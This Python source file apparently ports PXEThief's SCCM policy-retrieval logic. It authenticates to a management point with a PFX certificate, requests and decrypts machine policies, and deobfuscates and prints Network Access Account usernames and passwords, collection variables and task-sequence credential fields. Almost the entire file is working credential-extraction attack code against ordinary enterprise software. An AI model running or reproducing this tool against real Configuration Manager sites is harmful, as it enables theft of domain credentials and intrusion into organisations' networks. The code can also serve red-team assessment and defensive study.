import binascii
import datetime
import zlib
import os
import xml.etree.ElementTree as ET

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
from requests_toolbelt.multipart.decoder import MultipartDecoder

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, utils
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.x509 import load_der_x509_certificate
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from Crypto.Cipher import DES3


class PolicyRetriever:
    """Retrieves and decrypts SCCM policies using PFX client certificate.
    Ported from PXEThief's policy retrieval logic to work on Linux.
    """

    def __init__(self, mp_url, site_code, pfx_bytes, pfx_password):
        self.mp_url = mp_url.rstrip("/")
        self.site_code = site_code
        self.pfx_bytes = pfx_bytes
        self.pfx_password = pfx_password

        # Load PFX
        self.private_key, self.cert, _ = pkcs12.load_key_and_certificates(
            pfx_bytes, pfx_password.encode()
        )

    def _sign_data_sha256(self, data):
        """Sign data with SHA256 + RSA PKCS1v15, mimicking Windows CryptSignHash
        with CRYPT_NOHASHOID. Windows reverses the byte order of the signature.
        """
        digest = hashes.Hash(hashes.SHA256())
        digest.update(data)
        hash_value = digest.finalize()

        signature = self.private_key.sign(
            hash_value,
            padding.PKCS1v15(),
            utils.Prehashed(hashes.SHA256())
        )
        # Windows CryptSignHash returns little-endian (reversed) signature
        return binascii.hexlify(signature[::-1]).decode()

    def _aes_des_key_derivation(self, password):
        """CryptDeriveKey key derivation — same as sccm.py."""
        from hashlib import sha1
        key_sha1 = sha1(password).digest()
        b0 = b""
        for x in key_sha1:
            b0 += bytes((x ^ 0x36,))
        b1 = b""
        for x in key_sha1:
            b1 += bytes((x ^ 0x5c,))
        b0 += b"\x36" * (64 - len(b0))
        b1 += b"\x5c" * (64 - len(b1))
        b0_sha1 = sha1(b0).digest()
        b1_sha1 = sha1(b1).digest()
        return b0_sha1 + b1_sha1

    def _3des_decrypt(self, data, key):
        """3DES CBC decryption with null IV."""
        des3 = DES3.new(key, DES3.MODE_CBC, b"\x00" * 8)
        decrypted = des3.decrypt(data)
        return decrypted.decode("utf-16-le")

    def _deobfuscate_credential_string(self, credential_string):
        """Deobfuscate SCCM credential strings (NAA passwords etc).
        Ported from PXEThief's deobfuscate_credential_string.
        """
        key_data = binascii.unhexlify(credential_string[8:88])
        encrypted_data = binascii.unhexlify(credential_string[128:])
        key = self._aes_des_key_derivation(key_data)
        last_8 = (len(encrypted_data) // 8) * 8
        return self._3des_decrypt(encrypted_data[:last_8], key[:24])

    def _cms_decrypt(self, encrypted_data):
        """Decrypt CMS/PKCS7 enveloped data using the PFX private key.
        Uses openssl cms via subprocess as fallback since Python libraries
        don't easily support CMS envelope decryption.
        """
        import subprocess
        import tempfile

        # Write cert and key to temp files
        cert_pem = self.cert.public_bytes(serialization.Encoding.PEM)
        key_pem = self.private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption()
        )

        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as cert_f:
            cert_f.write(cert_pem)
            cert_path = cert_f.name
        with tempfile.NamedTemporaryFile(suffix=".pem", delete=False) as key_f:
            key_f.write(key_pem)
            key_path = key_f.name
        with tempfile.NamedTemporaryFile(suffix=".der", delete=False) as data_f:
            data_f.write(encrypted_data)
            data_path = data_f.name

        try:
            # Try CMS with -keyid flag (SCCM uses SubjectKeyIdentifier, not IssuerAndSerial)
            attempts = [
                ["openssl", "cms", "-decrypt", "-inform", "DER",
                 "-in", data_path, "-recip", cert_path, "-inkey", key_path, "-keyid"],
                ["openssl", "cms", "-decrypt", "-inform", "DER",
                 "-in", data_path, "-recip", cert_path, "-inkey", key_path],
                ["openssl", "smime", "-decrypt", "-inform", "DER",
                 "-in", data_path, "-recip", cert_path, "-inkey", key_path],
            ]
            for cmd in attempts:
                result = subprocess.run(cmd, capture_output=True)
                if result.returncode == 0:
                    return result.stdout
            raise ValueError(f"openssl decrypt failed: {result.stderr.decode()}")

        finally:
            os.unlink(cert_path)
            os.unlink(key_path)
            os.unlink(data_path)

    def retrieve_policies(self, client_id, output_dir):
        """Full policy retrieval flow:
        1. Get MPKEYINFORMATIONMEDIA
        2. Generate auth signatures
        3. Request policy assignments
        4. Download NAAConfig, TaskSequence, CollectionSettings
        5. Decrypt and extract credentials
        """
        os.makedirs(output_dir, exist_ok=True)
        session = requests.Session()

        # Use the media GUID as CCMClientID
        ccm_client_id = client_id

        # Generate signatures
        print("[*] Generating client authentication signatures...")
        data = ccm_client_id.encode("utf-16-le") + b'\x00\x00'
        ccm_client_id_sig = self._sign_data_sha256(data)

        ccm_timestamp = datetime.datetime.utcnow().replace(microsecond=0).isoformat() + 'Z'
        data = ccm_timestamp.encode("utf-16-le") + b'\x00\x00'
        ccm_timestamp_sig = self._sign_data_sha256(data)

        data = (ccm_client_id + ';' + ccm_timestamp + "\0").encode("utf-16-le")
        client_token_sig = self._sign_data_sha256(data)

        # Get x64UnknownMachineGUID from MP
        print(f"[*] Requesting MPKEYINFORMATIONMEDIA from {self.mp_url}...")
        r = session.get(self.mp_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
        root = ET.fromstring(r.text)
        machine_client_id = root.find("UnknownMachines").get("x64UnknownMachineGUID")
        sitecode = root.find("SITECODE").text
        print(f"[*] Site code: {sitecode}, x64UnknownMachineGUID: {machine_client_id}")

        # Save MPKEYINFORMATIONMEDIA
        with open(os.path.join(output_dir, "MPKEYINFORMATIONMEDIA.xml"), "w") as f:
            f.write(r.text)

        # Build policy request payloads
        first_payload = b'\xFF\xFE' + (
            '<Msg><ID/><SourceID>' + machine_client_id +
            '</SourceID><ReplyTo>direct:OSD</ReplyTo>'
            '<Body Type="ByteRange" Offset="0" Length="728"/>'
            '<Hooks><Hook2 Name="clientauth">'
            '<Property Name="Token"><![CDATA[ClientToken:' +
            ccm_client_id + ';' + ccm_timestamp +
            '\r\nClientTokenSignature:' + client_token_sig +
            '\r\n]]></Property></Hook2></Hooks>'
            '<Payload Type="inline"/>'
            '<TargetEndpoint>MP_PolicyManager</TargetEndpoint>'
            '<ReplyMode>Sync</ReplyMode></Msg>'
        ).encode("utf-16-le")

        second_payload = (
            '<RequestAssignments SchemaVersion="1.00" RequestType="Always" '
            'Ack="False" ValidationRequested="CRC">'
            '<PolicySource>SMS:' + sitecode + '</PolicySource>'
            '<ServerCookie/><Resource ResourceType="Machine"/>'
            '<Identification><Machine><ClientID>' + machine_client_id +
            '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN>'
            '<SID/></Machine></Identification></RequestAssignments>\r\n'
        ).encode("utf-16-le") + b'\x00\x00\x00'

        me = MultipartEncoder(fields={
            'Msg': (None, first_payload, "text/plain; charset=UTF-16"),
            'RequestAssignments': second_payload
        })

        print("[*] Requesting policy assignments...")
        r = session.request(
            "CCM_POST",
            self.mp_url + "/ccm_system/request",
            data=me,
            headers={'Content-Type': me.content_type.replace("form-data", "mixed")}
        )

        multipart_data = MultipartDecoder.from_response(r)

        # Parse policy assignments
        policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
        wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

        with open(os.path.join(output_dir, "ReplyAssignments.xml"), "w") as f:
            f.write(wf_policy_xml)

        root = ET.fromstring(wf_policy_xml)
        policy_urls = {}
        dedup = 0

        for pa in root.findall("PolicyAssignment"):
            for policy in pa.findall("Policy"):
                cat = policy.get("PolicyCategory")
                url = policy.find("PolicyLocation").text.replace("http://<mp>", self.mp_url)
                if cat and cat not in policy_urls:
                    policy_urls[cat] = url
                elif cat is None:
                    pid = policy.get("PolicyID", "")
                    safe_pid = "".join(i for i in pid if i not in "\\/:*?<>|")
                    policy_urls[safe_pid] = url
                else:
                    policy_urls[cat + str(dedup)] = url
                    dedup += 1

        print(f"[*] {len(policy_urls)} policy assignment URLs found")

        headers = {
            'CCMClientID': ccm_client_id,
            'CCMClientIDSignature': ccm_client_id_sig,
            'CCMClientTimestamp': ccm_timestamp,
            'CCMClientTimestampSignature': ccm_timestamp_sig
        }

        # Download relevant policies
        results = {"naa": [], "ts": [], "col": []}

        for category, url in policy_urls.items():
            if "NAAConfig" in category:
                print(f"[*] Requesting NAAConfig from: {url}")
                results["naa"].append(session.get(url, headers=headers))
            if "TaskSequence" in category:
                print(f"[*] Requesting TaskSequence from: {url}")
                results["ts"].append(session.get(url, headers=headers))
            if "CollectionSettings" in category:
                print(f"[*] Requesting CollectionSettings from: {url}")
                results["col"].append(session.get(url, headers=headers))

        # Process NAA configs
        print("\n[*] Processing Network Access Account Configuration...")
        for resp in results["naa"]:
            try:
                # Try plaintext first (HTTPS case)
                try:
                    naa_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    # Encrypted — decrypt with cert
                    print("[*] Decrypting NAA policy with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    naa_xml = decrypted.decode("utf-16-le")

                naa_xml = "".join(c for c in naa_xml if c.isprintable())

                with open(os.path.join(output_dir, "NAAConfig.xml"), "w") as f:
                    f.write(naa_xml)

                self._process_naa_xml(naa_xml)
            except Exception as e:
                print(f"[!] Failed to process NAA config: {e}")
                # Save raw response for manual analysis
                with open(os.path.join(output_dir, "NAAConfig.raw"), "wb") as f:
                    f.write(resp.content)
                print(f"[*] Saved raw NAA response to {os.path.join(output_dir, 'NAAConfig.raw')}")

        # Process Task Sequences
        print("\n[*] Processing Task Sequence Configuration...")
        for i, resp in enumerate(results["ts"]):
            try:
                try:
                    ts_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    print("[*] Decrypting Task Sequence policy with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    ts_xml = decrypted.decode("utf-16-le")

                ts_xml = "".join(c for c in ts_xml if c.isprintable())

                ts_path = os.path.join(output_dir, f"TaskSequence_{i}.xml")
                with open(ts_path, "w") as f:
                    f.write(ts_xml)
                print(f"[*] Saved Task Sequence to {ts_path}")

                self._process_task_sequence_xml(ts_xml, output_dir)
            except Exception as e:
                print(f"[!] Failed to process Task Sequence: {e}")
                with open(os.path.join(output_dir, f"TaskSequence_{i}.raw"), "wb") as f:
                    f.write(resp.content)

        # Process Collection Settings
        print("\n[*] Processing Collection Settings...")
        for resp in results["col"]:
            try:
                try:
                    col_xml = resp.content.decode("utf-16-le")
                except (UnicodeDecodeError, AttributeError):
                    print("[*] Decrypting Collection Settings with PFX cert...")
                    decrypted = self._cms_decrypt(resp.content)
                    col_xml = decrypted.decode("utf-16-le")

                col_xml = "".join(c for c in col_xml if c.isprintable())

                with open(os.path.join(output_dir, "CollectionSettings.xml"), "w") as f:
                    f.write(col_xml)

                # Decompress and parse collection variables
                root = ET.fromstring(col_xml)
                col_data = zlib.decompress(binascii.unhexlify(root.text)).decode("utf-16-le")
                col_data = "".join(c for c in col_data if c.isprintable())
                root = ET.fromstring(col_data)

                instances = root.find("PolicyRule").find("PolicyAction").findall("instance")
                for instance in instances:
                    name_el = instance.find(".//*[@name='Name']/value")
                    val_el = instance.find(".//*[@name='Value']/value")
                    if name_el is not None and val_el is not None:
                        var_name = name_el.text
                        var_secret = self._deobfuscate_credential_string(val_el.text)
                        var_secret = var_secret[:var_secret.rfind('\x00')]
                        print(f"[!] Collection Variable: '{var_name}' = '{var_secret}'")
            except Exception as e:
                print(f"[!] Failed to process Collection Settings: {e}")

    def _process_naa_xml(self, naa_xml):
        """Extract NAA credentials from policy XML."""
        root = ET.fromstring(naa_xml)

        # Look for CCM_NetworkAccessAccount instances
        for instance in root.iter("instance"):
            class_attr = instance.get("class", "")
            if "CCM_NetworkAccessAccount" in class_attr:
                username_el = instance.find(".//*[@name='NetworkAccessUsername']/value")
                password_el = instance.find(".//*[@name='NetworkAccessPassword']/value")

                if username_el is not None and username_el.text:
                    username = self._deobfuscate_credential_string(username_el.text)
                    username = username[:username.rfind('\x00')]
                    print(f"[!] Network Access Account Username: '{username}'")

                if password_el is not None and password_el.text:
                    password = self._deobfuscate_credential_string(password_el.text)
                    password = password[:password.rfind('\x00')]
                    print(f"[!] Network Access Account Password: '{password}'")

    def _process_task_sequence_xml(self, ts_xml, output_dir):
        """Extract credentials from task sequence policies."""
        root = ET.fromstring(ts_xml)

        pkg_name_el = root.find(".//*[@name='PKG_Name']/value")
        adv_id_el = root.find(".//*[@name='ADV_AdvertisementID']/value")
        ts_seq_el = root.find(".//*[@name='TS_Sequence']/value")

        pkg_name = pkg_name_el.text if pkg_name_el is not None else "Unknown"
        adv_id = adv_id_el.text if adv_id_el is not None else "Unknown"

        print(f"[*] Task Sequence: {pkg_name} ({adv_id})")

        if ts_seq_el is not None and ts_seq_el.text:
            ts_sequence = ts_seq_el.text
            if ts_sequence[:9] == "<sequence":
                # Plaintext
                pass
            else:
                try:
                    ts_sequence = self._deobfuscate_credential_string(ts_sequence)
                    ts_sequence = ts_sequence[:ts_sequence.rfind(">") + 1]
                    print(f"[*] Successfully decrypted TS_Sequence")
                except Exception:
                    print(f"[!] Failed to decrypt TS_Sequence")
                    return

            ts_name = f"{pkg_name}-{adv_id}"
            safe_name = "".join(c for c in ts_name if c.isalnum() or c in " ._-").rstrip()
            ts_path = os.path.join(output_dir, f"{safe_name}.xml")
            with open(ts_path, "w") as f:
                f.write(ts_sequence)
            print(f"[*] Wrote TS_Sequence to {ts_path}")

            # Search for credential fields
            self._find_creds_in_ts(ts_sequence)

    def _find_creds_in_ts(self, ts_xml):
        """Search task sequence XML for credential fields."""
        try:
            root = ET.fromstring(ts_xml)
        except ET.ParseError:
            return

        keywords = ["password", "account", "username"]
        found = False

        for elem in root.iter():
            for attr_name, attr_val in elem.attrib.items():
                for kw in keywords:
                    if kw in attr_name.lower():
                        if not found:
                            print("[!] Possible credential fields found:")
                            found = True
                        # Print the element and its parent context
                        name = elem.get("name", elem.get("property", elem.tag))
                        value = elem.text or attr_val
                        if len(value) > 200:
                            value = value[:200] + "..."
                        print(f"    {attr_name}={name}: {value}")
